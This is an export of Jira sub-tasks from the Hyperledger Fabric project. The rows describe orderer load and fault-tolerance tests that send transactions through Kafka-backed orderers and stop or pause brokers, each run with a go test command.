"sending 1,000,000 tx to 3 orderers, 4 kafka brokers on 1 channel and masterSpy on one orderer for all channels",FAB-4795,18105,16114,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,16/Jun/17 4:53 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"* *Test Name*: FAB_4795-ORD85-sending txs to 3 orderers, 4 kafka broker on 1 channel
 * *Component*: Orderer
 * *Description*: 1 Producer per Orderer-channel send 1,000,000 Tx to 3 orderers on 1 channel with 4 kafka broker. Confirm all Tx delivered (wait/poll consumer as necessary), with no problems. (1) This will launch the network with the configuration mentioned below, starts the deliver clients first and each client will be connected to each orderer, starts broadcast clients for each orderer and starts sending the traffic to the orderers. (2) Using a separate thread, join a masterSpy to an orderer to monitor all the channels
 * *Artifact Locations*: fabric/test/tools/OTE
 * *Network Topology*: 3 orderers, 4 kafka brokers, 3 zookeeper, 2 orgs with 2 peers in each
 * *Client Driver*: OTE
 * *Input*: go test -run ORD85 -timeout 50m
 * *Output*: if the test ran successfully, should be able to see pass as the output",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy39b:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"sending 1,000,000 tx to 1 orderer, 4 kafka brokers on 3 channels and masterSpy on the orderer for all channels",FAB-4796,18106,16114,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,16/Jun/17 4:54 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"* *Test Name*: FAB_4796-ORD86-sending txs to 1 orderer, 4 kafka broker on 3 channels
 * *Component*: Orderer
 * *Description*: 1 Producer per Orderer-channel send 1,000,000 Tx to 1 orderer on 3 channels with 4 kafka brokers. Confirm all Tx delivered (wait/poll consumer as necessary), with no problems. (1) This will launch the network with the configuration mentioned below, starts the deliver clients first and each client will be connected to each orderer, starts broadcast clients for each orderer and starts sending the traffic to the orderers. (2) Using a separate thread, join a masterSpy to the orderer to monitor all the channels
 * *Artifact Locations*: fabric/test/tools/OTE
 * *Network Topology*: 1 orderer, 4 kafka brokers, 3 zookeeper, 2 orgs with 2 peers in each
 * *Client Driver*: OTE
 * *Input*: go test -run ORD86 -timeout 50m
 * *Output*: if the test ran successfully, should be able to see pass as the output",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy39j:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"sending 1,000,000 tx to 3 orderers, 4 kafka brokers on 3 channels and masterSpy on one orderer for all channels",FAB-4797,18107,16114,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,16/Jun/17 4:54 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"* *Test Name*: FAB_4797-ORD87-sending txs to 3 orderers, 4 kafka broker on 3 channels
 * *Component*: Orderer
 * *Description*: 1 Producer per Orderer-channel send 1,000,000 Tx to 3 orderers on 3 channels with 4 kafka brokers. Confirm all Tx delivered (wait/poll consumer as necessary), with no problems. (1) This will launch the network with the configuration mentioned below, starts the deliver clients first and each client will be connected to each orderer, starts broadcast clients for each orderer and starts sending the traffic to the orderers. (2) Using a separate thread, join a masterSpy to one of the orderer to monitor all the channels
 * *Artifact Locations*: fabric/test/tools/OTE
 * *Network Topology*: 3 orderers, 4 kafka brokers, 3 zookeepers, 2 orgs with 2 peers in each
 * *Client Driver*: OTE
 * *Input*: go test -run ORD87 -timeout 50m
 * *Output*: if the test ran successfully, should be able to see pass as the output",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy39r:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"sending 1,000,000 tx to 1 orderer, 4 kafka brokers on 100 channels and masterSpy on the orderer for all channels",FAB-4798,18108,16114,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,16/Jun/17 4:54 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"* *Test Name*: FAB_4798-ORD90-sending txs to 1 orderer, 4 kafka broker on 100 channels
 * *Component*: Orderer
 * *Description*: 1 Producer per Orderer-channel send 1,000,000 Tx to 1 orderer on 100 channels with 4 kafka brokers. Confirm all Tx delivered (wait/poll consumer as necessary), with no problems. (1) This will launch the network with the configuration mentioned below, starts the deliver clients first and each client will be connected to each orderer, starts broadcast clients for each orderer and starts sending the traffic to the orderers. (2) Using a separate thread, join a masterSpy to the orderer to monitor all the channels
 * *Artifact Locations*: fabric/test/tools/OTE
 * *Network Topology*: 1 orderer, 4 kafka brokers, 3 zookeeper, 2 orgs with 2 peers in each
 * *Client Driver*: OTE
 * *Input*: go test -run ORD90 -timeout 120m
 * *Output*: if the test ran successfully, should be able to see pass as the output",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy39z:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"sending 1,000,000 tx to 3 orderers, 4 kafka brokers on 100 channels and masterSpy on one orderer for all channels",FAB-4799,18109,16114,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,16/Jun/17 4:55 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"* *Test Name*: FAB_4797-ORD87-sending txs to 3 orderers, 4 kafka broker on 100 channels
 * *Component*: Orderer
 * *Description*: 1 Producer per Orderer-channel send 1,000,000 Tx to 3 orderers on 100 channels with 4 kafka brokers. Confirm all Tx delivered (wait/poll consumer as necessary), with no problems. (1) This will launch the network with the configuration mentioned below, starts the deliver clients first and each client will be connected to each orderer, starts broadcast clients for each orderer and starts sending the traffic to the orderers. (2) Using a separate thread, join a masterSpy to one of the orderer to monitor all the channels
 * *Artifact Locations*: fabric/test/tools/OTE
 * *Network Topology*: 3 orderers, 4 kafka brokers, 3 zookeepers, 2 orgs with 2 peers in each
 * *Client Driver*: OTE
 * *Input*: go test -run ORD87 -timeout 50m
 * *Output*: if the test ran successfully, should be able to see pass as the output",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy3a7:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Stopping an orderer while sending continous traffic to 3 orderers, 4 kafka brokers on 1 channel",FAB-4800,18110,16114,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,16/Jun/17 4:55 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"* *Test Name*: FAB_4800-ORD92-sending txs to 3 orderers, 4 kafka broker on 1 channel
 * *Component*: Orderer
 * *Description*: 1 Producer per Orderer-channel send 500,000 Tx to 3 orderers on 1 channel with 4 kafka brokers. Confirm all Tx delivered (wait/poll consumer as necessary), with no problems. (1) This will launch the network with the configuration mentioned below, starts the deliver clients first and each client will be connected to each orderer, starts broadcast clients for each orderer and starts sending the traffic to the orderers. (2) Using a separate thread, stop the first orderer, wait for 1minute, and then restart it. (3) Reconnect the broadcast clients to send the transactions and deliver clients to receive both before and after the orderer restarted
 *  *Artifact Locations*: fabric/test/tools/OTE
 * *Network Topology*: 3 orderers, 4 kafka brokers, 3 zookeepers, 2 orgs with 2 peers in each
 * *Client Driver*: OTE
 * *Input*: go test -run ORD92 -timeout 50m
 * *Output*: if the test ran successfully, should be able to see pass as the output",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy3af:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Pausing an orderer while sending continous traffic to 3 orderers, 4 kafka brokers on 1 channel",FAB-4801,18111,16114,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,16/Jun/17 4:56 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"* *Test Name*: FAB_4801-ORD93-sending txs to 3 orderers, 4 kafka broker on 1 channel
 * *Component*: Orderer
 * *Description*: 1 Producer per Orderer-channel send 500,000 Tx to 3 orderers on 1 channels with 4 kafka brokers. Confirm all Tx delivered (wait/poll consumer as necessary), with no problems. (1) This will launch the network with the configuration mentioned below, starts the deliver clients first and each client will be connected to each orderer, starts broadcast clients for each orderer and starts sending the traffic to the orderers. (2) Using a separate thread, pause the first orderer, wait for 30 seconds, and then unpause it. (3) Reconnect the broadcast clients to send the transactions and deliver clients to receive both before and after the orderer restarted
 *  *Artifact Locations*: fabric/test/tools/OTE
 * *Network Topology*: 3 orderers, 4 kafka brokers, 3 zookeepers, 2 orgs with 2 peers in each
 * *Client Driver*: OTE
 * *Input*: go test -run ORD93 -timeout 50m
 * *Output*: if the test ran successfully, should be able to see pass as the output",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy3an:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Sequential restart of kafka brokers while sending traffic to 3 orderers, 4 kafka brokers on 1 channel",FAB-4802,18112,16114,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,16/Jun/17 4:56 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,," 
 * *Test Name*: FAB_4802-ORD94-sending txs to 3 orderers, 4 kafka brokers on 1 channel
 * *Component*: Orderer
 * *Description*: 1 Producer per Orderer-channel send 500,000 Tx to 3 orderers on 1 channels with 4 kafka brokers. Confirm all Tx delivered (wait/poll consumer as necessary), with no problems. (1) This will launch the network with the configuration mentioned below, starts the deliver clients first and each client will be connected to each orderer, starts broadcast clients for each orderer and starts sending the traffic to the orderers. (2) Using a separate thread, stop the first kafka broker, wait for 30 seconds, and then restart it. wait for 2 minutes, followed by other kafka brokers as well (3) Reconnect the broadcast clients to send the transactions and deliver clients to receive both before and after the orderer restarted
 * *Artifact Locations*: fabric/test/tools/OTE
 * *Network Topology*: 3 orderers, 4 kafka brokers, 3 zookeepers, 2 orgs with 2 peers in each
 * *Client Driver*: OTE
 * *Input*: go test -run ORD94 -timeout 50m
 * *Output*: if the test ran successfully, should be able to see pass as the output",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy3av:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Sequential pausing of kafka brokers while sending traffic to 3 orderers, 4 kafka brokers on 1 channel",FAB-4803,18113,16114,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,16/Jun/17 5:03 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"* *Test Name*: FAB_4803-ORD95-sending txs to 3 orderers, 4 kafka brokers on 1 channel
 * *Component*: Orderer
 * *Description*: 1 Producer per Orderer-channel send 500,000 Tx to 3 orderers on 1 channel with 4 kafka brokers. Confirm all Tx delivered (wait/poll consumer as necessary), with no problems. (1) This will launch the network with the configuration mentioned below, starts the deliver clients first and each client will be connected to each orderer, starts broadcast clients for each orderer and starts sending the traffic to the orderers. (2) Using a separate thread, pause the first kafka broker, wait for 15 seconds, and then unpause it, wait for sometime, followed by other kafka brokers as well (3) Reconnect the broadcast clients to send the transactions and deliver clients to receive both before and after the orderer restarted
 * *Artifact Locations*: fabric/test/tools/OTE
 * *Network Topology*: 3 orderers, 4 kafka brokers, 3 zookeepers, 2 orgs with 2 peers in each
 * *Client Driver*: OTE
 * *Input*: go test -run ORD95 -timeout 50m
 * *Output*: if the test ran successfully, should be able to see pass as the output",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy3b3:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Stopping two kafka brokers after setting MIN_ISR to 2 while sending traffic to 3 orderers, 4 kafka brokers on 1 channel",FAB-4804,18114,16114,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,16/Jun/17 5:04 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"* *Test Name*: FAB_4804-ORD96-sending txs to 3 orderers, 4 kafka brokers on 1 channel
 * *Component*: Orderer
 * *Description*: 1 Producer per Orderer-channel send 300,000 Tx to 3 orderers on 1 channels with 4 kafka brokers. Confirm all Tx delivered (wait/poll consumer as necessary), with no problems. (1) This will launch the network with the configuration mentioned below, starts the deliver clients first and each client will be connected to each orderer, starts broadcast clients for each orderer and starts sending the traffic to the orderers. (2) Using a separate thread, stop the first kafka broker, wait for 15 seconds, and then stop the second kafka broker. wait for 1minute and then start the second and first kafka brokers with 15 seconds gap (3) Reconnect the broadcast clients to send the transactions and deliver clients to receive both before and after the orderer restarted
 * *Artifact Locations*: fabric/test/tools/OTE
 * *Network Topology*: 3 orderers, 4 kafka brokers, 3 zookeepers, 2 orgs with 2 peers in each
 * *Client Driver*: OTE
 * *Input*: go test -run ORD96 -timeout 50m
 * *Output*: if the test ran successfully, should be able to see pass as the output",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy3bb:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Stopping three kafka brokers out of 4 after setting MIN_ISR to 2 while sending traffic to 3 orderers, 4 kafka brokers on 1 channel",FAB-4805,18115,16114,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,16/Jun/17 5:05 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"* *Test Name*: FAB_4805-ORD97-sending txs to 3 orderers, 4 kafka brokers on 1 channel
 * *Component*: Orderer
 * *Description*: 1 Producer per Orderer-channel send 300,000 Tx to 3 orderers on 1 channels with 4 kafka brokers. Confirm all Tx delivered (wait/poll consumer as necessary), with no problems. (1) This will launch the network with the configuration mentioned below, starts the deliver clients first and each client will be connected to each orderer, starts broadcast clients for each orderer and starts sending the traffic to the orderers. (2) Using a separate thread, stop the first kafka broker, wait for 15 seconds, and then stop the second kafka broker. wait for 1minute, restart the third kafka broker and then start the second and first kafka brokers with 15 seconds gap (3) Reconnect the broadcast clients to send the transactions and deliver clients to receive both before and after the orderer restarted
 * *Artifact Locations*: fabric/test/tools/OTE
 * *Network Topology*: 3 orderers, 4 kafka brokers, 3 zookeepers, 2 orgs with 2 peers in each
 * *Client Driver*: OTE
 * *Input*: go test -run ORD97 -timeout 50m
 * *Output*: if the test ran successfully, should be able to see pass as the output",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy3bj:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Pausing two kafka brokers after setting MIN_ISR to 2 while sending traffic to 3 orderers, 4 kafka brokers on 1 channel",FAB-4806,18116,16114,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,16/Jun/17 5:05 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"* *Test Name*: FAB_4806-ORD98-sending txs to 3 orderers, 4 kafka brokers on 1 channel
 * *Component*: Orderer
 * *Description*: 1 Producer per Orderer-channel send 300,000 Tx to 3 orderers on 1 channels with 4 kafka brokers. Confirm all Tx delivered (wait/poll consumer as necessary), with no problems. (1) This will launch the network with the configuration mentioned below, starts the deliver clients first and each client will be connected to each orderer, starts broadcast clients for each orderer and starts sending the traffic to the orderers. (2) Using a separate thread, pause the first kafka broker, wait for 15 seconds, and then pause the second kafka broker. wait for 1minute and then unpause the second and first kafka brokers with 15 seconds gap (3) Reconnect the broadcast clients to send the transactions and deliver clients to receive both before and after the orderer restarted
 * *Artifact Locations*: fabric/test/tools/OTE
 * *Network Topology*: 3 orderers, 4 kafka brokers, 3 zookeepers, 2 orgs with 2 peers in each
 * *Client Driver*: OTE
 * *Input*: go test -run ORD98 -timeout 50m
 * *Output*: if the test ran successfully, should be able to see pass as the output",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy3br:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Pausing all kafka brokers after setting MIN_ISR to 2 while sending traffic to 3 orderers, 4 kafka brokers on 1 channel",FAB-4807,18117,16114,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,16/Jun/17 5:06 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"* *Test Name*: FAB_4807-ORD99-sending txs to 3 orderers, 4 kafka brokers on 1 channel
 * *Component*: Orderer
 * *Description*: 1 Producer per Orderer-channel send 300,000 Tx to 3 orderers on 1 channels with 4 kafka brokers. Confirm all Tx delivered (wait/poll consumer as necessary), with no problems. (1) This will launch the network with the configuration mentioned below, starts the deliver clients first and each client will be connected to each orderer, starts broadcast clients for each orderer and starts sending the traffic to the orderers. (2) Using a separate thread, pause all the kafka brokers, and then unpause all the kafka brokers in reverse order (3) Reconnect the broadcast clients to send the transactions and reconnect deliver clients so they will receive transactions sent both before and after the orderer restarted.  The delay between the pause action and the unpause action is critical; See also ORD-110, which uses a different delay; a shorter delay should go unnoticed, whereas a longer delay could trigger SERVICE_UNAVAILABLE (503) msgs to the consumers (deliver clients) and the broadcast-producers clients.
 * *Artifact Locations*: fabric/test/tools/OTE
 * *Network Topology*: 3 orderers, 4 kafka brokers, 3 zookeepers, 2 orgs with 2 peers in each
 * *Client Driver*: OTE
 * *Input*: go test -run ORD99 -timeout 50m
 * *Output*: if the test ran successfully, should be able to see pass as the output",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy3bz:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"sending 1 tx to 1 orderer solo on 1 channel, Batchtimeout=20s",FAB-4808,18118,16112,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,latitiah,scottz,scottz,16/Jun/17 5:06 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,23/Sep/17 4:14 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"* *Test Name*: FAB_4808-ORD100-sending txs to 1orderer solo on 1channel
 * *Component*: Orderer
 * *Description*: 1 Producer per Orderer-channel send 1 Tx to 1 channel on 1 orderer solo. Confirm the Tx delivered (wait/poll consumer as necessary), with no problems. CONFIGTX_ORDERER_BATCHZTIMEOUT=20s. (1) This will launch the network with the configuration mentioned below, starts the deliver clients first and each client will be connected to each orderer, starts broadcast clients for each orderer and starts sending the traffic to the orderers.
 * *Artifact Locations*: fabric/test/tools/OTE
 * *Network Topology*: 1 orderer solo, 2 orgs with 2 peers in each
 * *Client Driver*: OTE
 * *Input*: go test -run ORD100 -timeout 30m
 * *Output*: if the test ran successfully, should be able to see pass as the output",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-3516,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy3c7:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,release-2.4,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,lindluni-patch-1,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"sending 1 tx to 1 orderer, 1kafka broker on 1 channel, Batchtimeout=20s",FAB-4809,18119,16112,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,latitiah,scottz,scottz,16/Jun/17 5:07 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,23/Sep/17 4:15 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"* *Test Name*: FAB_4809-ORD101-sending txs to 1orderer, 1 kafka broker on 1channel
 * *Component*: Orderer
 * *Description*: 1 Producer per Orderer-channel send 1 Tx to 1 channel on 1 orderer with 1 kafka broker. Confirm the Tx delivered (wait/poll consumer as necessary), with no problems. CONFIGTX_ORDERER_BATCHZTIMEOUT=20s. (1) This will launch the network with the configuration mentioned below, starts the deliver clients first and each client will be connected to each orderer, starts broadcast clients for each orderer and starts sending the traffic to the orderers.
 * *Artifact Locations*: fabric/test/tools/OTE
 * *Network Topology*: 1 orderer, 1 kafka broker, 1 zookeeper 2 orgs with 2 peers in each
 * *Client Driver*: OTE
 * *Input*: go test -run ORD101 -timeout 30m
 * *Output*: if the test ran successfully, should be able to see pass as the output",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-3516,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy3cf:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
